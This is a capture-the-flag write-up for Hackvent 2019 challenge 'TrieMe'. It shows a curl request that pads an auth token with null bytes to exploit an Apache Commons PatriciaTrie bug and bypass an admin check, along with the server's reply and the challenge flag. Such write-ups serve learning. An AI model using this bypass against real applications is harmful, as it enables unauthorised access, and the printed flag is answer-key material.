# HV19.13 - TrieMe

| Author | Level | Categories |
|---|---|---|
| kiwi | medium | fun |

## Given 
Switzerland's national security is at risk. As you try to infiltrate a secret spy facility to save the nation you stumble upon an interesting looking login portal.

Can you break it and retrieve the critical information?

Facility: http://whale.hacking-lab.com:8888/trieme/
[HV19.13-NotesBean.java.zip](34913db9-fd2a-43c8-b563-55a1d10ee4cb.zip)

## Approach

Here's the one approach that worked:
- So, we want to become Admin - what looks odd is, that a security token must NOT be found in a data structure...
- This puts the focus on that PatriciTrie.containsKey method.
- Google for "Java PatriciaTrie containsKey bug"
- Eventually find https://issues.apache.org/jira/browse/COLLECTIONS-714, saying that adding an already existing key padded with a null byte to a PatriciaTrie structure removes an already existing key.

```bash
$ curl 'http://whale.hacking-lab.com:8888/trieme/faces/index.xhtml' -i \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Cookie: JSESSIONID=F42C98923EAF777AE65D8E59595261A2' \
--data 'j_idt14=j_idt14&j_idt14%3Aname=auth_token_4835989%00%00&j_idt14%3Aj_idt15=login&javax.faces.ViewState=7831036928425351547%3A7209554679698124656'
HTTP/1.1 200 
X-Powered-By: JSF/2.0
Content-Type: text/html;charset=UTF-8
Content-Length: 560
Date: Fri, 13 Dec 2019 21:46:49 GMT

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
     <title>SpyPortal</title><link type="text/css" rel="stylesheet" href="/trieme/faces/javax.faces.resource/style.css?ln=css" /></head><body>
     <h3>Secret Spy Portal</h3>
     <h4>STATUS:
      We will steal all the national chocolate supplies at christmas, 3pm: Here's the building codes: HV19{get_th3_chocolateZ}
      
  !</h4></body>
</html>
```

### Other approaches (not successful)
- Try to find vulnerabilities on Tomcat
- Serialize tons of Java objects and try to inject them through every possible parameter (cookies, queryparams, headers, request body, and more)
- Question the reason of why I'm even participating at Hackvent
- Try to leverage some more powerful tool and spin up an Amazon VM to receive the reverse shell

Once more, the whole thing is harder if you're not doing this kind of analysis at least from time to time.
But let's not forget that we do it for fun and to learn something (which was definitely the case here).


## Credits and Kudos
Massive credits go once more to *mcia*, who was once more able to open my eyes with subtle yet precise hints with no spoilers. Whithout him I would have gone to bed. Thanks mate. :D

## Flag:
`HV19{get_th3_chocolateZ}`
